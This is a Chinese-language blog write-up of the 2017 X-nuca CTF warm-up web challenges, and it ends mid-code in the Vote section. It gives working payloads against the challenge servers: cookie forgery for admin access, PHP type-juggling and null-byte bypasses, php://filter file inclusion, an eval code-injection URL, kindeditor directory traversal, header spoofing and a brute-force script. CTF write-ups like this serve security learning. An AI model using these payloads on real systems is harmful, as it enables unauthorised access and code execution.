<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[2017X-nuca] 赛前热身Writeup | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

    <script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-87275583-1', 'auto');
    ga('send', 'pageview');

</script>


    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[2017X-nuca] 赛前热身Writeup</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Aug 15, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
    </p>
  </header>

  <article class="post-content">
  <h1 id="part-3786d38172c372d">捉迷藏</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20111/index.php">http://218.76.35.75:20111/index.php</a></li>
</ul>

<p>进去之后查看源码：</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/1.png" alt="sourceCode"><br>
发现有隐藏链接:Index.php (Linux中对url大小写敏感)<br>
手动输入后发现被跳转回来<br>
于是在命令行使用curl工具逃逸跳转(curl默认不跟随跳转)</p>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/2.png" alt="poc"></p>

<ul>
<li>Payload: <strong>curl  <a href="http://218.76.35.75:20111/Index.php">http://218.76.35.75:20111/Index.php</a></strong></li>
</ul>

<hr>

<h1 id="part-40dde6d9932b1d1c">简单的问答</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20112/">http://218.76.35.75:20112</a>
进去之后查看源代码发现题目全是扯淡
源码截图如下：</li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/3.png" alt="sourceCode"><br>
分析form后提交post（工具：HackBar）<br>
PS:后台估计是没有处理q4字段，直接处理q3字段了</p>

<ul>
<li>Payload: 
url -&gt; <strong><a href="http://218.76.35.75:20112">http://218.76.35.75:20112</a></strong>
Post Field -&gt; <strong>q1=2016&amp;q2=lol&amp;q3=22&amp;success=true</strong></li>
</ul>

<hr>

<h1 id="part-6540d6b5b61c86fa">后台后台后台</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20113/">http://218.76.35.75:20113/</a>
进去之后只有一个Enter按钮可被操作，
目的是获得admin权限
观察到Response有新Cookie被set，</li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/4.png" alt="Cookie"></p>

<p>Member疑似Base64，Decode后发现是Normal，猜测这是基于Cookie的Auth，直接在浏览器控制台修改Cookie后点击Enter后获得Flag。</p>

<ul>
<li>Payload:
<strong>document.cookie=&quot;User=admin&quot;</strong>
<strong>document.cookie=&quot;Member=QWRtaW4=&quot;</strong> &lt;--这是Admin字符串的base64 Encode</li>
</ul>

<hr>

<h1 id="php">PHP是最好的语言</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20114/">http://218.76.35.75:20114</a>
进去看到源码，白盒审计
代码如下：</li>
</ul>
<div class="highlight"><pre><code class="language-php" data-lang="php"> <span class="cp">&lt;?php</span>
<span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="nv">$v1</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$v2</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$v3</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="nv">$a</span><span class="o">=</span><span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nb">json_decode</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$a</span><span class="p">)){</span> <span class="c1">//foo反序列化后必须为数组或者能强制转换为数组</span>
    <span class="nb">is_numeric</span><span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar1"</span><span class="p">])</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"nope"</span><span class="p">)</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span> <span class="c1">//foo中包含一个k为bar1，v不能为数字的kv对</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar1"</span><span class="p">]){</span>
        <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar1"</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">2016</span><span class="p">)</span><span class="o">?</span><span class="nv">$v1</span><span class="o">=</span><span class="mi">1</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span> 
        <span class="c1">//此v必须大于2016，这里用到了PHP的一个弱类型特点，在PHP中，当'2017aaaaabbbb' 与数字2016比较时，PHP会尝试把前者转换成数字，故前者会被转换成2017，这与(int)'2017asdadasd' = 2017是符合的，看下面[图1]</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar2"</span><span class="p">])){</span> <span class="c1">//foo中必须含有一个k为bar2，v为数组的kv对</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar2"</span><span class="p">])</span><span class="o">!==</span><span class="mi">5</span> <span class="nx">OR</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar2"</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"nope"</span><span class="p">);</span>
        <span class="c1">//bar2的v中的数组元素必须等于5个，并且第一个元素必须还是为数组</span>
        <span class="nv">$pos</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s2">"nudt"</span><span class="p">,</span> <span class="nv">$a</span><span class="p">[</span><span class="s2">"a2"</span><span class="p">]);</span>
        <span class="nv">$pos</span><span class="o">===</span><span class="kc">false</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"nope"</span><span class="p">)</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span>
        <span class="c1">//foo中必须包含一个k为a2，v为nudt的kv对（我觉得出题人这里是想出成bar2中必须包含一个v为nudt的kv对）</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">"bar2"</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$val</span><span class="p">){</span>
            <span class="nv">$val</span><span class="o">===</span><span class="s2">"nudt"</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"nope"</span><span class="p">)</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span>
            <span class="c1">//bar2里面的元素不允许包含nudt字符串</span>
        <span class="p">}</span>
        <span class="nv">$v2</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$c</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cat'</span><span class="p">];</span>
<span class="nv">$d</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dog'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$c</span><span class="p">[</span><span class="mi">1</span><span class="p">]){</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nv">$d</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$c</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="nv">$d</span><span class="p">){</span>
        <span class="nb">eregi</span><span class="p">(</span><span class="s2">"3|1|c"</span><span class="p">,</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$c</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"nope"</span><span class="p">)</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span>
        <span class="nb">strpos</span><span class="p">((</span><span class="nv">$c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nv">$d</span><span class="p">),</span> <span class="s2">"htctf2016"</span><span class="p">)</span><span class="o">?</span><span class="nv">$v3</span><span class="o">=</span><span class="mi">1</span><span class="o">:</span><span class="k">NULL</span><span class="p">;</span>
        <span class="c1">//这里利用了eregi会被%00截断的特点构造payload绕过检测</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$v1</span> <span class="o">&amp;&amp;</span> <span class="nv">$v2</span> <span class="o">&amp;&amp;</span> <span class="nv">$v3</span><span class="p">){</span>
    <span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<ul>
<li>Payload:<strong><a href="http://218.76.35.75:20114/?foo=%7B%22bar1%22:%222017Pr0ph3t%22,%22bar2%22:%5B%5B%22%22%5D,%22%22,%22%22,%22%22,%22%22%5D,%22a2%22:%5B%22fuck%22,%22nudt%22%5D%7D&cat%5B0%5D=%00%EF%BF%BDhtctf2016&cat%5B1%5D%5B%5D=1&dog=222">http://218.76.35.75:20114/?foo={&quot;bar1&quot;:&quot;2017Pr0ph3t&quot;,&quot;bar2&quot;:[[&quot;&quot;],&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;],&quot;a2&quot;:[&quot;fuck&quot;,&quot;nudt&quot;]}&amp;cat[0]=%00�htctf2016&amp;cat[1][]=1&amp;dog=222</a></strong></li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/5.png" alt="图1"></p>

<hr>

<h1 id="login">Login</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20115/">http://218.76.35.75:20115/</a>
进去之后随便点点观察到Url为?page=xxx，很有可能是文件包含，直接试一波php伪协议, <strong>php://filter/convert.base64-encode/resource=main</strong>发现可以，遂读取页面源码
----------- index.php ----------</li>
</ul>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$pwhash</span><span class="o">=</span><span class="s2">"ffd313052dab00927cb61064a392f30ee454e70f"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'log'</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'log'</span><span class="p">]</span><span class="o">.</span><span class="s2">".log"</span><span class="p">)){</span>
        <span class="k">include</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'index'</span><span class="p">){</span>
    <span class="k">include</span><span class="p">((</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">.</span><span class="s2">".php"</span><span class="o">:</span><span class="s2">"main.php"</span><span class="p">));</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div>
<p>----------- main.php ----------</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>trolol<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;center&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"./?page=main"</span><span class="nt">&gt;</span>main<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"./?page=info"</span><span class="nt">&gt;</span>server info<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"./?page=login"</span><span class="nt">&gt;</span>login<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/center&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div>
<p>----------- login.php ------------</p>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$login</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">];</span>
<span class="nv">$password</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$login</span><span class="o">==</span><span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nb">sha1</span><span class="p">(</span><span class="o">@</span><span class="nv">$password</span><span class="p">)</span><span class="o">==</span><span class="nv">$pwhash</span><span class="p">){</span>
    <span class="k">include</span><span class="p">(</span><span class="s1">'flag.txt'</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$login</span><span class="o">&amp;&amp;@</span><span class="nv">$password</span><span class="o">&amp;&amp;@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Login error, login credentials has been saved to ./log/"</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$login</span><span class="p">)</span><span class="o">.</span><span class="s2">".log"</span><span class="p">;</span>
    <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">"./log/"</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">".log"</span><span class="p">;</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">,</span> <span class="nv">$login</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="nv">$password</span><span class="p">);</span>
<span class="p">}</span><span class="sb">```
```</span><span class="nx">html</span>
    <span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
        <span class="nx">login</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
        <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">""</span> <span class="nx">method</span><span class="o">=</span><span class="s2">"POST"</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="s2">"login"</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"login"</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
            <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">"password"</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
            <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nx">value</span><span class="o">=</span><span class="s2">"Go!"</span><span class="o">&gt;</span>
        <span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="nx">center</span><span class="o">&gt;</span>
</code></pre></div>
<p>这一题比较迷。。因为题目逻辑貌似是直接随便包含一个log文件就能出flag。。<br>
基本思路是，登陆带debug生成log然后在index.php里发log的参数。。<br>
但是其实这一题估计是出题人改崩了。。。<br>
王师傅有更6的解题思路。。。(我觉得这应该是正确的)。。<br>
详情请移步<a href="http://www.jianshu.com/p/fd9f38753078">http://www.jianshu.com/p/fd9f38753078</a></p>

<hr>

<h1 id="part-ef69fb7efe6256c4">简单的文件上传</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20122/">http://218.76.35.75:20122</a>
中规中矩的上传检测，后台检测后缀和MIME类型，要求是php后缀并且MIME是jpg，直接F12截包修改MIME得到flag</li>
</ul>

<hr>

<h1 id="js">简单的JS</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20123/">http://218.76.35.75:20123</a>
打开页面有提示<strong>The evil url is the passkey</strong>，查看源码有</li>
</ul>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> 
<span class="nx">p</span><span class="o">=</span><span class="dl">"</span><span class="s2">60,105,102,114,97,109,101,32,104,101,105,103,104,116,61,48,32,119,105,100,116,104,61,48,32,115,114,99,61,34,46,47,102,108,48,97,46,112,104,112,34,62</span><span class="dl">"</span>
<span class="nx">p</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">String.fromCharCode(</span><span class="dl">"</span><span class="o">+</span><span class="nx">p</span><span class="o">+</span><span class="dl">"</span><span class="s2">)</span><span class="dl">"</span><span class="p">);</span> 
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">p</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script&gt;</span><span class="err"> 
</span></code></pre></div>
<p>在控制台解码后为</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;iframe</span> <span class="na">height=</span><span class="s">0</span> <span class="na">width=</span><span class="s">0</span> <span class="na">src=</span><span class="s">"./fl0a.php"</span><span class="nt">&gt;</span>
</code></pre></div>
<p>访问<strong><a href="http://218.76.35.75:20123/fl0a.php">http://218.76.35.75:20123/fl0a.php</a></strong>后查看cookie得到flag**</p>

<hr>

<h1 id="php">PHP是一门松散的语言</h1>

<ul>
<li><p>题目url：<a href="http://218.76.35.75:20124/">http://218.76.35.75:20124</a><br>
打开页面有源码提示，发现存在parse_str可以变量覆盖，直接上payload。</p></li>
<li><p>Payload:<a href="http://218.76.35.75:20124/?heetian=he=abcd">http://218.76.35.75:20124/?heetian=he=abcd</a></p></li>
</ul>

<hr>

<h1 id="part-ef69fb7efd9889f4">简单的文件包含</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20126/">http://218.76.35.75:20126</a>
题目描述是：flag在/flag里
打开页面随便点开一个page发现url疑似包含，伪协议不能用，所以根据题目描述把参数改成?page=/flag后在源码中可以得到下一个文件的名字，访问那个文件得到flag</li>
</ul>

<hr>

<h1 id="part-40dde6d994704e3d">简单的验证</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:20127/">http://218.76.35.75:20127</a>
根据题目描述得知我们要变成admin才有权限看flag
页面并没有啥有用信息，查看cookie得到user和guess，看来又是一题基于cookie的Auth，因为是guess，所以可以猜到是爆破，直接上脚本：</li>
</ul>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># -------- 简单的验证
</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://218.76.35.75:20127/index.php'</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'user'</span><span class="p">:</span><span class="s">'admin'</span><span class="p">,</span><span class="s">'guess'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">x</span><span class="p">})</span>
    <span class="k">print</span> <span class="s">'[*] Trying '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">'not'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">'[*] The guess num is '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="k">print</span> <span class="s">'[*] Content----------'</span>
        <span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">content</span>
        <span class="nb">exit</span><span class="p">()</span>
</code></pre></div>
<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/6.png" alt="poc"></p>

<hr>

<h1 id="gg">GG</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:65380/">http://218.76.35.75:65380/</a>
进去以后是一个俄罗斯方块（我还玩了一下233333）
玩的过程中并没有在请求里面发现于后台的交互，这是前端题？
查看美化后的JS，发现有个地方比较奇怪</li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/7.png" alt="奇怪的地方"></p>

<p>这里貌似是明示了一个js文件，名字是e100.js<br>
访问一下发现是久违的jsFuck，直接丢进控制台就alert出flag了</p>

<hr>

<h1 id="reappear">Reappear</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:65180/">http://218.76.35.75:65180/</a>
进去以后发现是kindeditor，访问有文件遍历漏洞的php发现能用，看到attached文件夹下有flag_clue.php，访问之后发现疑似倒着的base64，python切片走一波，得到结果再base64解码后出flag</li>
</ul>

<p><img src="/assets/images/posts/2017/X-nuca-%E8%B5%9B%E5%89%8D%E7%83%AD%E8%BA%ABWriteup/8.png" alt="poc"></p>

<ul>
<li>Payload：<strong><a href="http://218.76.35.75:65180/kindeditor/php/file_manager_json.php?path=/">http://218.76.35.75:65180/kindeditor/php/file_manager_json.php?path=/</a></strong></li>
</ul>

<hr>

<h1 id="drinkcoffee">DrinkCoffee</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:65280/">http://218.76.35.75:65280/</a>
进去以后有<strong>Hint: Find the password to submit, but you should come from <a href="http://www.iie.ac.cn">http://www.iie.ac.cn</a> and your IP must be 10.10.20.1</strong>
并在Response header发现有password
那很清晰就是修改http header了，这里推荐一个火狐的插件叫：Modify Header
修改Referer为http://<a href="http://www.iie.ac.cn%EF%BC%8CX-Forward-for%E4%B8%BA10.10.20.1">www.iie.ac.cn，X-Forward-for为10.10.20.1</a> ，然后把password拿到md5解密网站查找一下，找到密码为cafe，直接post上去即可拿到flag</li>
</ul>

<hr>

<h1 id="default">Default</h1>

<ul>
<li>题目url：<a href="http://218.76.35.74:20131/">http://218.76.35.74:20131</a>
进去以后啥都没有，根据提示开扫描器直接骚（立个flag，自己写一个扫描器）
骚到index2.php
访问之后发现有源码，是一个代码注入</li>
</ul>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 

<span class="k">include</span> <span class="s2">"flag2.php"</span><span class="p">;</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'hello'</span><span class="p">];</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">"var_dump(</span><span class="nv">$a</span><span class="s2">);"</span><span class="p">);</span> 
</code></pre></div>
<p>直接上Payload<br>
- Payload:<strong><a href="http://218.76.35.74:20131/index2.php?hello=);show_source(&#x27;flag2.php">http://218.76.35.74:20131/index2.php?hello=);show_source(&#39;flag2.php</a>&#39;</strong></p>

<hr>

<h1 id="vote">Vote</h1>

<ul>
<li>题目url：<a href="http://218.76.35.75:65080/">http://218.76.35.75:65080/</a>
进去以后顺手扫一波，这里推荐一下自家的扫描器，介绍在下一篇文章
扫出备份文件, .index.php.swp后下载查看源码（不知道为什么这里vim -r无法修复文件，所以直接hexdump -C把能读的弄了出来，再用python切片倒叙一下再整理一下逻辑就有了大概的源码了。</li>
</ul>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#coding:utf8
</span>
<span class="n">raw</span> <span class="o">=</span> <span class="s">'''echo '&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;';
echo '&lt;/table&gt;';
echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1], 2).'&lt;/td&gt;&lt;/tr&gt;';
$arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = ".$r['id']));
echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
$arr = mysql_fetch_array(mysql_query("SELECT title FROM t_picture WHERE id = ".$r['id']));
while ($r = mysql_fetch_array($q)) {
    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
    echo '&lt;table border="1"&gt;';
    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';


    $q = mysql_query("SELECT id FROM t_vote WHERE user = '{$login}' GROUP BY id");
    $q = mysql_query("INSERT INTO t_vote VALUES ({$id}, {$vote}, '{$login}')");
    $vote = 1;
    if ($vote &gt; 5 || $vote &lt; 1) $vote = (int) $_POST['vote'];
    $id = $_POST['id'];
    die('please select ...');
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id'])) if (isset($_POST['submit'])) {
        $login = $_SESSION['login'];
    }
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
    if (!isset($_SESSION['login'])) {
        session_start();
        include 'db.php'; &lt; ?'''</span>

<span class="n">arr</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">arr</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div>
<p>得出大概的源码</p>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span> 
<span class="nb">session_start</span><span class="p">();</span>
